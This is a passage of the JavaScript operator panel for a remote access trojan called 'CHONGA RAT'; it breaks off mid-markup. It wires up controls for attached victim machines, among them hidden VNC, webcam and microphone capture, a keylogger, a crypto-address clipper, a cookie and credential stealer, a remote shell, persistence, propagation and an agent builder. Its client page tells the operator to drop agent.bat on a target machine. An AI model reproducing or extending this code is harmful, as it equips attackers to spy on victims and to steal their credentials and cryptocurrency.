/* ==========================================================================
   CHONGA RAT — panel application
   Everything is driven by /api/* on the panel host. There is no remote C2.
   Multiple agents can be attached; every call carries the selected client id.
   ========================================================================== */
"use strict";

/* ---------------------------------------------------------------- icons -- */
const P = {
  grid: '<rect x="3.5" y="3.5" width="7" height="7" rx="1.6"/><rect x="13.5" y="3.5" width="7" height="7" rx="1.6"/><rect x="3.5" y="13.5" width="7" height="7" rx="1.6"/><rect x="13.5" y="13.5" width="7" height="7" rx="1.6"/>',
  monitor: '<rect x="2.5" y="4" width="19" height="12.5" rx="2"/><path d="M8 20.5h8M12 16.5v4"/>',
  layers: '<path d="M12 3 3 7.5l9 4.5 9-4.5L12 3Z"/><path d="m3 12 9 4.5 9-4.5"/><path d="m3 16.5 9 4.5 9-4.5"/>',
  camera: '<path d="M3 8.5A2.5 2.5 0 0 1 5.5 6h1L8 4h8l1.5 2h1A2.5 2.5 0 0 1 21 8.5v9A2.5 2.5 0 0 1 18.5 20h-13A2.5 2.5 0 0 1 3 17.5v-9Z"/><circle cx="12" cy="13" r="3.4"/>',
  mic: '<rect x="9" y="3" width="6" height="11" rx="3"/><path d="M5.5 11.5a6.5 6.5 0 0 0 13 0M12 18v3M9 21h6"/>',
  speaker: '<path d="M4 9.5h3L12 5v14l-5-4.5H4z"/><path d="M16 9a4 4 0 0 1 0 6M18.5 6.5a8 8 0 0 1 0 11"/>',
  folder: '<path d="M3 7.5A2 2 0 0 1 5 5.5h4l2 2.5h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-10Z"/>',
  cpu: '<rect x="6" y="6" width="12" height="12" rx="2"/><rect x="9.5" y="9.5" width="5" height="5" rx="1"/><path d="M9 2.5v3M15 2.5v3M9 18.5v3M15 18.5v3M2.5 9h3M2.5 15h3M18.5 9h3M18.5 15h3"/>',
  terminal: '<rect x="2.5" y="4" width="19" height="16" rx="2.4"/><path d="m7 9 3 3-3 3M13 15h4"/>',
  key: '<circle cx="8" cy="15.5" r="4"/><path d="m11 12.5 8-8M16.5 7.5l2 2M19 5l2 2"/>',
  power: '<path d="M12 3v9"/><path d="M6.5 6.5a8 8 0 1 0 11 0"/>',
  window: '<rect x="3" y="4.5" width="18" height="15" rx="2"/><path d="M3 9h18M6.5 6.8h.01M9 6.8h.01"/>',
  keyboard: '<rect x="2.5" y="6" width="19" height="12" rx="2"/><path d="M6 10h.01M9 10h.01M12 10h.01M15 10h.01M18 10h.01M8 14h8"/>',
  clipboard: '<rect x="5" y="4.5" width="14" height="16" rx="2"/><path d="M9 4.5V3h6v1.5M9 10h6M9 14h6"/>',
  coins: '<ellipse cx="12" cy="6.5" rx="7" ry="3"/><path d="M5 6.5v5c0 1.7 3.1 3 7 3s7-1.3 7-3v-5"/><path d="M5 11.5v5c0 1.7 3.1 3 7 3s7-1.3 7-3v-5"/>',
  database: '<ellipse cx="12" cy="6" rx="7.5" ry="3"/><path d="M4.5 6v12c0 1.7 3.4 3 7.5 3s7.5-1.3 7.5-3V6"/><path d="M4.5 12c0 1.7 3.4 3 7.5 3s7.5-1.3 7.5-3"/>',
  globe: '<circle cx="12" cy="12" r="8.5"/><path d="M3.5 12h17M12 3.5c2.4 2.3 3.6 5.2 3.6 8.5S14.4 18.2 12 20.5c-2.4-2.3-3.6-5.2-3.6-8.5S9.6 5.8 12 3.5Z"/>',
  radar: '<circle cx="12" cy="12" r="8.5"/><circle cx="12" cy="12" r="4.5"/><path d="M12 12 18 6"/><circle cx="12" cy="12" r="1"/>',
  link: '<path d="M9.5 14.5 14.5 9.5"/><path d="M7 12.5 5 14.5a3.5 3.5 0 0 0 5 5l2-2"/><path d="m17 11.5 2-2a3.5 3.5 0 0 0-5-5l-2 2"/>',
  shuffle: '<path d="M3 7h4l3 5 3 5h5"/><path d="M3 17h4l3-5"/><path d="m15.5 4.5 3 2.5-3 2.5M15.5 14.5l3 2.5-3 2.5"/>',
  remote: '<rect x="8" y="2.5" width="8" height="19" rx="2"/><path d="M11 5.5h2M10.5 18.5h3"/>',
  anchor: '<circle cx="12" cy="5" r="2.5"/><path d="M12 7.5V21M5 12H2.5a9.5 9.5 0 0 0 19 0H19"/>',
  branch: '<circle cx="6" cy="5" r="2.5"/><circle cx="6" cy="19" r="2.5"/><circle cx="18" cy="12" r="2.5"/><path d="M6 7.5v9M8.5 5h3.5a3 3 0 0 1 3 3v1.5M8.5 19H12a3 3 0 0 0 3-3v-1.5"/>',
  puzzle: '<path d="M10 3.5a2 2 0 0 1 4 0V5h3.5a1.5 1.5 0 0 1 1.5 1.5V10h-1.5a2 2 0 0 0 0 4H19v3.5a1.5 1.5 0 0 1-1.5 1.5H14v-1.5a2 2 0 0 0-4 0V19H6.5A1.5 1.5 0 0 1 5 17.5V14h1.5a2 2 0 0 0 0-4H5V6.5A1.5 1.5 0 0 1 6.5 5H10V3.5Z"/>',
  zap: '<path d="M13 2.5 4.5 13.5H11l-1 8 8.5-11H12l1-8Z"/>',
  message: '<path d="M20.5 12a8.5 8.5 0 0 1-8.5 8.5H4l2.2-3.3A8.5 8.5 0 1 1 20.5 12Z"/>',
  box: '<path d="m12 3 8 4.5v9L12 21l-8-4.5v-9L12 3Z"/><path d="m4 7.5 8 4.5 8-4.5M12 12v9"/>',
  settings: '<circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.7 1.7 0 0 0 .3 1.9l.1.1a2 2 0 1 1-2.8 2.8l-.1-.1a1.7 1.7 0 0 0-1.9-.3 1.7 1.7 0 0 0-1 1.5V21a2 2 0 1 1-4 0v-.1a1.7 1.7 0 0 0-1.1-1.5 1.7 1.7 0 0 0-1.9.3l-.1.1a2 2 0 1 1-2.8-2.8l.1-.1a1.7 1.7 0 0 0 .3-1.9 1.7 1.7 0 0 0-1.5-1H3a2 2 0 1 1 0-4h.1A1.7 1.7 0 0 0 4.6 9a1.7 1.7 0 0 0-.3-1.9l-.1-.1a2 2 0 1 1 2.8-2.8l.1.1a1.7 1.7 0 0 0 1.9.3H9a1.7 1.7 0 0 0 1-1.5V3a2 2 0 1 1 4 0v.1a1.7 1.7 0 0 0 1 1.5 1.7 1.7 0 0 0 1.9-.3l.1-.1a2 2 0 1 1 2.8 2.8l-.1.1a1.7 1.7 0 0 0-.3 1.9V9a1.7 1.7 0 0 0 1.5 1H21a2 2 0 1 1 0 4h-.1a1.7 1.7 0 0 0-1.5 1Z"/>',
  refresh: '<path d="M20 11a8 8 0 1 0-.6 4"/><path d="M20 4.5V11h-6.5"/>',
  play: '<path d="m8 5 11 7-11 7V5Z"/>',
  stop: '<rect x="6" y="6" width="12" height="12" rx="1.5"/>',
  download: '<path d="M12 3v12M7.5 10.5 12 15l4.5-4.5M4 20h16"/>',
  upload: '<path d="M12 16V4M7.5 8.5 12 4l4.5 4.5M4 20h16"/>',
  trash: '<path d="M4 7h16M9 7V4.5h6V7M6.5 7l1 13h9l1-13M10 11v5M14 11v5"/>',
  edit: '<path d="M4 20h4l10-10-4-4L4 16v4ZM14.5 5.5l4 4"/>',
  search: '<circle cx="11" cy="11" r="7"/><path d="m20 20-4-4"/>',
  x: '<path d="M6 6l12 12M18 6 6 18"/>',
  plus: '<path d="M12 5v14M5 12h14"/>',
  check: '<path d="m4.5 12.5 5 5 10-11"/>',
  alert: '<path d="M12 3 2.5 20h19L12 3Z"/><path d="M12 9v5M12 17h.01"/>',
  lock: '<rect x="4.5" y="10" width="15" height="10.5" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/>',
  chevron: '<path d="m9 6 6 6-6 6"/>',
  hash: '<path d="M9 3 7 21M17 3l-2 18M4 9h16M3 15h16"/>',
  eye: '<path d="M2.5 12S6 5.5 12 5.5 21.5 12 21.5 12 18 18.5 12 18.5 2.5 12 2.5 12Z"/><circle cx="12" cy="12" r="3"/>',
  filter: '<path d="M3 5h18l-7 8v6l-4 2v-8L3 5Z"/>',
  copy: '<rect x="8" y="8" width="12" height="12" rx="2"/><path d="M16 8V5.5A1.5 1.5 0 0 0 14.5 4H5.5A1.5 1.5 0 0 0 4 5.5v9A1.5 1.5 0 0 0 5.5 16H8"/>',
  wifi: '<path d="M2.5 8.5a14 14 0 0 1 19 0M6 12a9 9 0 0 1 12 0M9.5 15.5a4 4 0 0 1 5 0"/><circle cx="12" cy="19" r="1"/>',
  disc: '<circle cx="12" cy="12" r="8.5"/><circle cx="12" cy="12" r="2.5"/>',
  clock: '<circle cx="12" cy="12" r="8.5"/><path d="M12 7.5V12l3 2"/>',
  info: '<circle cx="12" cy="12" r="8.5"/><path d="M12 11v5M12 8h.01"/>',
  shield: '<path d="M12 3 4.5 6v6c0 4.5 3.2 8 7.5 9 4.3-1 7.5-4.5 7.5-9V6L12 3Z"/>',
};
function icon(name, cls) {
  return '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"' +
    (cls ? ' class="' + cls + '"' : "") + ">" + (P[name] || P.disc) + "</svg>";
}

/* ---------------------------------------------------------------- utils -- */
const $ = (s, r) => (r || document).querySelector(s);
const $$ = (s, r) => Array.from((r || document).querySelectorAll(s));
const esc = (v) => String(v === null || v === undefined ? "" : v).replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
const num = (v) => (Number(v) || 0).toLocaleString("en-US");

function bytes(n) {
  n = Number(n) || 0;
  const u = ["B", "KB", "MB", "GB", "TB"];
  let i = 0;
  while (n >= 1024 && i < u.length - 1) { n /= 1024; i++; }
  return (i ? n.toFixed(n < 10 ? 2 : 1) : Math.round(n)) + " " + u[i];
}
function dur(s) {
  s = Math.max(0, Math.round(Number(s) || 0));
  const d = Math.floor(s / 86400), h = Math.floor((s % 86400) / 3600), m = Math.floor((s % 3600) / 60);
  if (d) return d + "d " + h + "h";
  if (h) return h + "h " + m + "m";
  if (m) return m + "m " + (s % 60) + "s";
  return s + "s";
}
function pct(v) { return Math.max(0, Math.min(100, Number(v) || 0)).toFixed(0) + "%"; }
function when(ts) {
  if (!ts) return "—";
  const d = new Date(Number(ts) * 1000);
  return isNaN(d) ? "—" : d.toLocaleString();
}
function timeOf(ts) {
  const d = new Date(Number(ts) * 1000);
  return isNaN(d) ? "—" : d.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" });
}
function ago(ts) {
  if (!ts) return "—";
  const s = Math.max(0, Date.now() / 1000 - Number(ts));
  if (s < 60) return Math.floor(s) + "s ago";
  if (s < 3600) return Math.floor(s / 60) + "m ago";
  if (s < 86400) return Math.floor(s / 3600) + "h ago";
  return Math.floor(s / 86400) + "d ago";
}
function b64ToBlob(b64, mime) {
  const bin = atob(b64 || "");
  const arr = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
  return new Blob([arr], { type: mime || "application/octet-stream" });
}
function download(b64, name, mime) {
  const url = URL.createObjectURL(b64ToBlob(b64, mime));
  const a = document.createElement("a");
  a.href = url; a.download = name;
  document.body.appendChild(a); a.click(); a.remove();
  setTimeout(() => URL.revokeObjectURL(url), 4000);
}
function copyText(text) {
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(text).then(() => toast("Copied", "ok")).catch(() => fallbackCopy(text));
  } else fallbackCopy(text);
}
function fallbackCopy(text) {
  const t = document.createElement("textarea");
  t.value = text; t.style.position = "fixed"; t.style.opacity = "0";
  document.body.appendChild(t); t.select();
  try { document.execCommand("copy"); toast("Copied", "ok"); } catch (e) { toast("Copy failed", "err"); }
  t.remove();
}

/* ---------------------------------------------------------------- state -- */
const S = {
  token: "", route: "builder", connected: false, wasConnected: false,
  clients: [], client: localStorage.getItem("chonga.client") || "", clientMeta: null, manualClear: false,
  info: {}, features: [], httpPort: 0, agentPort: 0,
  lanIp: "", lan: false,
  timers: [], logs: [], events: [],
  screen: { quality: 58, monitor: 0, fps: 30, scale: 1, monitors: [] },
  hvnc: { open: false, hwnd: 0, quality: 58, fps: 30, scale: 1, mode: "", busy: false },
  webcam: { index: 0, quality: 72, busy: false, last: "" },
  files: { path: "", parent: "", entries: [], drives: [], filter: "" },
  proc: { rows: [], filter: "" },
  reg: { root: "HKCU", path: "", keys: [], values: [] },
  shell: { lines: [], hist: [], hpos: -1 },
  keylog: { text: "", on: false },
  clip: { history: [] },
  clipper: { hits: [] },
  steal: { tab: "cookies", data: {}, csv: null, busy: false },
  conns: { rows: [], filter: "" },
  chat: { messages: [], open: false, unread: 0 },
  tunnel: { id: "", host: "", port: 0, rx: 0, tx: 0, lines: [], polling: false },
  plugins: { rows: [], last: null },
  builder: { result: null, features: [] },
  logFilter: "",
};

/* ------------------------------------------------------------------ api -- */
async function api(path, opts) {
  opts = opts || {};
  const headers = Object.assign({}, opts.headers || {});
  if (!path.startsWith("/api/config")) headers["X-Panel-Token"] = S.token;
  const res = await fetch(path, Object.assign({}, opts, { headers, cache: "no-store" }));
  const text = await res.text();
  let data = {};
  if (text) { try { data = JSON.parse(text); } catch (e) { throw new Error("malformed response from " + path); } }
  if (!res.ok) throw new Error(data.error || ("HTTP " + res.status));
  return data;
}
async function cmd(command, args, timeout) {
  const body = { cmd: command, args: args || {}, client: S.client };
  if (timeout) body.timeout = timeout;
  const r = await api("/api/cmd", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  if (!r.ok) throw new Error(r.error || "command failed");
  return r.data || {};
}
function setClient(id) {
  S.client = id || "";
  try {
    if (S.client) localStorage.setItem("chonga.client", S.client);
    else localStorage.removeItem("chonga.client");
  } catch (e) {}
}
function applyClient() {
  // A restored selection only survives while that client still exists. Once
  // something else is attached, drop the stale id so auto-select can take over.
  if (S.client && S.clients.length && !S.clients.some((c) => c.id === S.client)) {
    setClient("");
    S.clientMeta = null;
  }
  // one attached client and nothing picked yet: just take it, so a single-host
  // setup never lands on an empty panel
  if (!S.client && !S.manualClear && S.clients.length === 1) {
    setClient(S.clients[0].id);
  }
  const live = S.clients.find((c) => c.id === S.client) || null;
  if (live) S.clientMeta = live;
  const meta = live || (S.client ? S.clientMeta : null);
  S.connected = !!live;
  S.info = (meta && meta.info) || {};
  S.features = (meta && meta.features) || [];
  S.connectedAt = meta ? meta.connectedAt : null;
  return live;
}
function selectedClient() {
  return S.clients.find((c) => c.id === S.client) || (S.client ? S.clientMeta : null);
}
async function state() {
  const st = await api("/api/state");
  S.clients = Array.isArray(st.clients) ? st.clients : [];
  applyClient();
  S.httpPort = st.httpPort || S.httpPort;
  S.agentPort = st.agentPort || S.agentPort;
  return st;
}

/* ------------------------------------------------------------- feedback -- */
function toast(message, kind) {
  const box = $("#toasts");
  if (!box) return;
  const el = document.createElement("div");
  el.className = "toast " + (kind || "");
  el.innerHTML = (kind === "err" ? "<b>Error</b>" : kind === "ok" ? "<b>Done</b>" : "<b>Notice</b>") + esc(message);
  box.appendChild(el);
  setTimeout(() => {
    el.style.transition = "opacity .25s ease, transform .25s ease";
    el.style.opacity = "0"; el.style.transform = "translateY(6px)";
    setTimeout(() => el.remove(), 260);
  }, kind === "err" ? 5200 : 3200);
}
function fail(e) { toast(e && e.message ? e.message : String(e), "err"); }
function busy(button, on) {
  if (!button) return;
  if (on) {
    if (!button.dataset.label) button.dataset.label = button.innerHTML;
    button.disabled = true;
    button.innerHTML = '<span class="spin"></span>';
  } else {
    button.disabled = false;
    if (button.dataset.label) button.innerHTML = button.dataset.label;
  }
}
async function run(button, fn) {
  busy(button, true);
  try { return await fn(); }
  catch (e) { fail(e); }
  finally { busy(button, false); }
}
function modal(title, bodyHTML, footHTML) {
  const host = $("#modal");
  host.innerHTML =
    '<div class="modal" role="dialog" aria-modal="true">' +
      '<div class="modal-head"><h3>' + esc(title) + '</h3>' +
        '<button class="btn btn-icon btn-ghost" data-close>' + icon("x") + "</button></div>" +
      '<div class="modal-body">' + bodyHTML + "</div>" +
      (footHTML ? '<div class="modal-foot">' + footHTML + "</div>" : "") +
    "</div>";
  host.classList.add("open");
  const close = () => { host.classList.remove("open"); host.innerHTML = ""; };
  $$("[data-close]", host).forEach((b) => b.addEventListener("click", close));
  host.onclick = (e) => { if (e.target === host) close(); };
  return { close: close, el: host };
}
function confirmBox(title, text, danger) {
  return new Promise((resolve) => {
    const m = modal(title,
      '<p class="small" style="margin:0;color:var(--muted);line-height:1.6">' + esc(text) + "</p>",
      '<button class="btn" data-no>Cancel</button><button class="btn ' + (danger ? "btn-danger" : "btn-primary") + '" data-yes>Confirm</button>');
    $("[data-no]", m.el).onclick = () => { m.close(); resolve(false); };
    $("[data-yes]", m.el).onclick = () => { m.close(); resolve(true); };
  });
}

/* ------------------------------------------------------------- registry -- */
const NAV = [
  { group: "Monitor", items: [
    { id: "overview", label: "Overview", icon: "grid" },
    { id: "desktop", label: "Desktop", icon: "monitor" },
    { id: "hvnc", label: "HVNC", icon: "layers" },
    { id: "webcam", label: "Webcam", icon: "camera" },
    { id: "mic", label: "Microphone", icon: "mic" },
    { id: "audio", label: "Desktop audio", icon: "speaker" },
  ] },
  { group: "System", items: [
    { id: "files", label: "Files", icon: "folder" },
    { id: "processes", label: "Processes", icon: "cpu" },
    { id: "shell", label: "Shell", icon: "terminal" },
    { id: "registry", label: "Registry", icon: "key" },
    { id: "startup", label: "Startup", icon: "power" },
    { id: "windows", label: "Windows", icon: "window" },
  ] },
  { group: "Surveillance", items: [
    { id: "keylog", label: "Keylogger", icon: "keyboard" },
    { id: "clipboard", label: "Clipboard", icon: "clipboard" },
    { id: "clipper", label: "Clipper", icon: "coins" },
    { id: "stealer", label: "Stealer", icon: "database" },
  ] },
  { group: "Network", items: [
    { id: "connections", label: "Connections", icon: "globe" },
    { id: "recon", label: "Recon & geo", icon: "radar" },
    { id: "tunnel", label: "Tunnel", icon: "link" },
    { id: "proxy", label: "SOCKS5 proxy", icon: "shuffle" },
    { id: "rustdesk", label: "RustDesk", icon: "remote" },
  ] },
  { group: "Control", items: [
    { id: "persistence", label: "Persistence", icon: "anchor" },
    { id: "propagation", label: "Propagation", icon: "branch" },
    { id: "plugins", label: "Plugins", icon: "puzzle" },
    { id: "actions", label: "Actions", icon: "zap" },
    { id: "chat", label: "Chat", icon: "message" },
  ] },
  { group: "Session", items: [
    { id: "settings", label: "Settings", icon: "settings" },
  ] },
];
const MODULE_IDS = new Set(NAV.reduce((all, g) => all.concat(g.items.map((i) => i.id)), []));

/* Only the Builder is global. Clients appears as soon as an agent attaches,
   and the module tabs appear once one of those clients is selected. */
function navModel() {
  const groups = [{ group: "Build", items: [{ id: "builder", label: "Builder", icon: "box" }] }];
  if (S.clients.length || S.client) {
    groups.push({ group: "Clients", items: [
      { id: "clients", label: "Clients", icon: "radar", count: S.clients.length },
    ] });
  }
  if (S.client) groups.push.apply(groups, NAV);
  return groups;
}
const VIEWS = {};

/* ----------------------------------------------------------------- shell -- */
function renderNav() {
  const host = $("#nav");
  host.innerHTML = navModel().map((g) =>
    '<div class="nav-group"><span>' + esc(g.group) + "</span>" +
    g.items.map((it) =>
      '<button class="nav-item' + (S.route === it.id ? " active" : "") + '" data-route="' + it.id + '">' +
        icon(it.icon) + "<span>" + esc(it.label) + "</span>" +
        (it.count ? '<span class="nav-count">' + it.count + "</span>" :
          (it.id === "chat" && S.chat.unread ? '<span class="nav-count">' + S.chat.unread + "</span>" : "")) +
      "</button>").join("") +
    "</div>").join("");
  $$(".nav-item", host).forEach((b) => b.addEventListener("click", () => {
    go(b.dataset.route);
    $("#sidebar").classList.remove("open");
  }));
}

function renderTop() {
  const meta = selectedClient();
  const info = (meta && meta.info) || {};
  const name = info.hostname || "—";
  const chip = $("#topRight");
  const agent = meta
    ? '<span class="chip"><i class="dot ' + (S.connected ? "on" : "off") + '"></i><b>' + esc(name) +
      '</b><span class="hide-sm">' + esc(info.username || (S.connected ? "" : "offline")) + "</span></span>"
    : '<span class="chip"><i class="dot off"></i><b>—</b><span class="hide-sm">no client selected</span></span>';
  chip.innerHTML =
    agent +
    (S.clients.length || S.client
      ? '<button class="btn btn-sm" id="switchClient">' + icon("radar") + " Clients</button>"
      : "") +
    '<span class="chip mono hide-sm">' + esc(S.token.slice(0, 8)) + "…</span>" +
    '<button class="btn btn-icon" id="refreshBtn" title="Refresh">' + icon("refresh") + "</button>";
  $("#refreshBtn").onclick = (e) => run(e.currentTarget, async () => {
    await state(); render();
    toast("State refreshed", "ok");
  });
  const sw = $("#switchClient");
  if (sw) sw.onclick = () => go("clients");

  const foot = $("#sideFoot");
  const feat = meta ? (S.connected ? S.features.length + " modules" : "offline") : "—";
  foot.innerHTML =
    '<div class="row"><span>Panel</span><b>' + esc(S.lan ? (S.lanIp || "lan") : "127.0.0.1") + ":" + esc(S.httpPort || 8787) + "</b></div>" +
    '<div class="row"><span>Agent port</span><b>' + esc(S.agentPort || 8790) + "</b></div>" +
    '<div class="row"><span>Clients</span><b>' + (S.clients.length || "—") + "</b></div>" +
    '<div class="row"><span>Selected</span><b>' + esc(meta ? name : "—") + "</b></div>" +
    '<div class="row"><span>Session</span><b>' + esc(feat) + "</b></div>";
}

function clearTimers() {
  S.timers.forEach((t) => { clearInterval(t); clearTimeout(t); });
  S.timers = [];
}
function every(fn, ms) {
  const id = setInterval(fn, ms);
  S.timers.push(id);
  return id;
}
function later(fn, ms) {
  const id = setTimeout(fn, ms);
  S.timers.push(id);
  return id;
}

function go(id) {
  if (!VIEWS[id]) id = "builder";
  if (MODULE_IDS.has(id) && !S.client) id = S.clients.length ? "clients" : "builder";
  if (id === "clients" && !S.clients.length && !S.client) id = "builder";
  if (id === "chat") S.chat.unread = 0;
  S.route = id;
  if (location.hash !== "#/" + id) location.hash = "#/" + id;
  render();
}

function render() {
  clearTimers();
  stopStream();
  if (MODULE_IDS.has(S.route) && !S.client) S.route = S.clients.length ? "clients" : "builder";
  if (S.route === "clients" && !S.clients.length && !S.client) S.route = "builder";
  const def = VIEWS[S.route] || VIEWS.builder;
  if (!def) return;
  $("#pageTitle").textContent = def.title;
  $("#pageSub").textContent = typeof def.sub === "function" ? def.sub() : def.sub;
  const v = $("#view");
  v.scrollTop = 0;
  RENDER_OFFLINE = false;
  v.innerHTML = def.render();
  renderNav();
  renderTop();
  if (def.mount && !RENDER_OFFLINE) {
    try { def.mount(v); } catch (e) { fail(e); }
  }
}

/* -------------------------------------------------------------- events -- */
function pushLog(ev) {
  S.logs.unshift(ev);
  if (S.logs.length > 240) S.logs.length = 240;
  if (S.route === "overview") paintLog("#ovLog");
}
function paintLog(sel) {
  const host = $(sel);
  if (!host) return;
  const rows = S.logs.slice(0, 80).map((e) =>
    '<div class="log-row"><time>' + esc(timeOf(e.ts || Date.now() / 1000)) + "</time>" +
    '<span class="tag">' + esc(e.event || "event") + "</span>" +
    '<span class="msg">' + esc(logText(e)) + "</span></div>").join("");
  host.innerHTML = rows || '<div class="empty">No events yet.</div>';
}
function logText(e) {
  const skip = new Set(["event", "ts"]);
  return Object.keys(e).filter((k) => !skip.has(k)).map((k) => k + "=" + (typeof e[k] === "object" ? JSON.stringify(e[k]) : e[k])).join("  ");
}

function connectSSE() {
  if (!S.token) return;
  const es = new EventSource("/api/events?token=" + encodeURIComponent(S.token));
  es.onmessage = (m) => {
    let ev;
    try { ev = JSON.parse(m.data); } catch (e) { return; }
    if (!ev || !ev.event) return;
    handleEvent(ev);
  };
  es.onerror = () => { /* EventSource retries automatically */ };
}

function syncChrome() {
  renderNav();
  renderTop();
}

function handleEvent(ev) {
  const mine = !ev.client || ev.client === S.client;
  if (mine) pushLog(ev);
  const refresh = () => {
    if (S.route === "clients" || S.route === "overview" || mine) render();
    else syncChrome();
  };
  switch (ev.event) {
    case "agent_connected":
      toast("Client attached: " + (ev.info && ev.info.hostname ? ev.info.hostname : ev.client || "host"), "ok");
      state().then(refresh).catch(() => {});
      break;
    case "agent_disconnected":
      toast("Client detached: " + (ev.info && ev.info.hostname ? ev.info.hostname : ev.client || "host"), "err");
      state().then(refresh).catch(() => {});
      break;
    case "agent_ready":
      state().then(refresh).catch(() => {});
      break;
    case "chat": {
      if (!mine) break;
      S.chat.messages.push({ who: ev.who || "user", text: ev.text || "", ts: ev.ts || Date.now() / 1000 });
      if (S.route !== "chat") { S.chat.unread++; renderNav(); }
      else paintChat();
      break;
    }
    case "chat_closed":
      S.chat.open = false;
      if (S.route === "chat") { paintChat(); }
      toast("Chat window closed");
      break;
    case "keylog":
      if (!mine) break;
      S.keylog.text += ev.text || "";
      if (S.route === "keylog") { const k = $("#keylogText"); if (k) k.value = S.keylog.text; }
      break;
    case "clipper":
      if (!mine) break;
      S.clipper.hits.unshift(ev);
      toast("Clipper replaced a " + (ev.coin || "crypto") + " address", "ok");
      if (S.route === "clipper") paintClipperHits();
      break;
    case "status":
      toast("Client status: " + (ev.status || "?") + (ev.note ? " — " + ev.note : ""));
      break;
    case "user_status":
      toast("Operator note set: " + (ev.text || ""));
      break;
    case "plugin_log":
      if (!mine) break;
      pushLog(ev);
      break;
    default:
      break;
  }
}

/* -------------------------------------------------------------- snippets -- */
function pageHead(title, sub, actions) {
  return '<div class="spread" style="margin-bottom:16px">' +
    "<div><h2 style=\"margin:0;font-size:19px;font-weight:700;letter-spacing:-.025em\">" + esc(title) + "</h2>" +
    '<p class="small muted" style="margin:3px 0 0">' + esc(sub) + "</p></div>" +
    '<div class="btn-row">' + (actions || "") + "</div></div>";
}
/* Set by offlineCard so render() knows the view has no controls to bind.
   Without this, mount() ran against the offline card and every $("#id", v)
   came back null, throwing "Cannot set properties of null" on the first
   .onclick assignment. */
let RENDER_OFFLINE = false;
function offlineCard(what) {
  RENDER_OFFLINE = true;
  const noPick = !S.client;
  return '<div class="card pad"><div class="empty">' + icon(noPick ? "radar" : "wifi") +
    "<div>" + (noPick ? "No client selected." : "This client is offline.") + "</div><div class=\"small\" style=\"margin-top:6px\">" +
    esc(noPick ? "Open the Clients tab and click a machine to load its modules."
      : (what || "Start a built agent to use this module.")) + "</div></div></div>";
}
function featureOn(name) { return S.features.indexOf(name) !== -1; }
function requireFeature(name) {
  if (S.connected && !featureOn(name)) {
    return '<div class="note warn">' + icon("alert") + "<div>This build was generated without the <b>" + esc(name) +
      "</b> feature. Rebuild the agent from the Builder page with that module enabled.</div></div>";
  }
  return "";
}
function table(cols, rows, renderRow, empty) {
  if (!rows.length) return '<div class="empty">' + icon("search") + esc(empty || "Nothing to show.") + "</div>";
  return '<div class="table-wrap"><table class="table"><thead><tr>' +
    cols.map((c) => "<th>" + esc(c) + "</th>").join("") +
    "</tr></thead><tbody>" + rows.map(renderRow).join("") + "</tbody></table></div>";
}
function kv(pairs) {
  return '<div class="kv">' + pairs.map((p) =>
    "<div>" + esc(p[0]) + "</div><div>" + (p[2] ? p[1] : esc(p[1])) + "</div>").join("") + "</div>";
}
function statCard(label, value, sub, meter) {
  return '<div class="card stat"><div class="stat-label">' + esc(label) + "</div>" +
    '<div class="stat-val">' + value + "</div>" +
    (sub ? '<div class="stat-sub">' + esc(sub) + "</div>" : "") +
    (meter === undefined || meter === null ? "" :
      '<div class="meter"><i style="width:' + pct(meter) + '"></i></div>') + "</div>";
}

/* ================================================================= clients */
function clientCard(c) {
  const i = c.info || {};
  const sel = c.id === S.client;
  const up = c.connectedAt ? dur(Date.now() / 1000 - c.connectedAt) : "—";
  return '<div class="card client-card' + (sel ? " sel" : "") + '" data-client="' + esc(c.id) + '">' +
    '<div class="card-head"><div><h3>' + esc(i.hostname || c.id) + "</h3><p>" + esc(i.os || "unknown os") + "</p></div>" +
      '<div class="right"><span class="badge ' + (sel ? "violet" : "ok") + '">' + (sel ? "selected" : "live") + "</span></div></div>" +
    '<div class="card-body">' +
      kv([
        ["User", (i.domain ? i.domain + "\\" : "") + (i.username || "—")],
        ["Address", c.peer || "—"],
        ["Arch", (i.arch || "—") + " · Python " + (i.python || "—")],
        ["Elevation", i.admin ? "administrator" : "standard"],
        ["Monitors", String(i.monitors || "—")],
        ["Attached for", up],
        ["Modules", String((c.features || []).length)],
        ["Client id", c.id],
      ]) +
      '<div class="hstack" style="margin-top:12px">' +
        '<button class="btn btn-primary btn-sm" data-open="' + esc(c.id) + '">Open modules</button>' +
      "</div>" +
    "</div></div>";
}

function clientSelection() {
  const meta = selectedClient();
  if (!meta) {
    return '<div class="empty">' + icon("radar") +
      "<div>—</div><div class=\"small\">Nothing selected. The module tabs stay hidden until you click a client.</div></div>";
  }
  const i = meta.info || {};
  return kv([
    ["Client", i.hostname || meta.id],
    ["User", (i.domain ? i.domain + "\\" : "") + (i.username || "—")],
    ["Address", meta.peer || "—"],
    ["OS", i.os || "—"],
    ["State", S.connected ? "connected" : "offline"],
  ]) + '<div class="hstack" style="margin-top:12px">' +
    '<button class="btn btn-primary btn-sm" id="clOpenSel">Open modules</button>' +
    '<button class="btn btn-sm" id="clClear">Clear selection</button></div>';
}

VIEWS.clients = {
  title: "Clients",
  sub: () => S.clients.length
    ? S.clients.length + " attached · click one to unlock its tabs"
    : "No clients attached — build an agent and run it",
  render() {
    return pageHead("Clients", "Every attached agent. Pick one and the rest of the tabs appear in the sidebar.",
      '<button class="btn btn-sm" id="clRefresh">' + icon("refresh") + ' Refresh</button>' +
      '<button class="btn btn-sm" id="clBuild">' + icon("box") + ' Builder</button>') +
      (S.clients.length
        ? '<div class="grid grid-3" id="clGrid">' + S.clients.map(clientCard).join("") + "</div>"
        : '<div class="card pad"><div class="empty">' + icon("radar") +
          "<div>No clients attached.</div><div class=\"small\" style=\"margin-top:6px\">Open the Builder tab, build an agent, drop <b>agent.bat</b> on the machine — it shows up here on its own.</div></div></div>") +
      '<div class="card" style="margin-top:16px"><div class="card-head"><h3>Selection</h3>' +
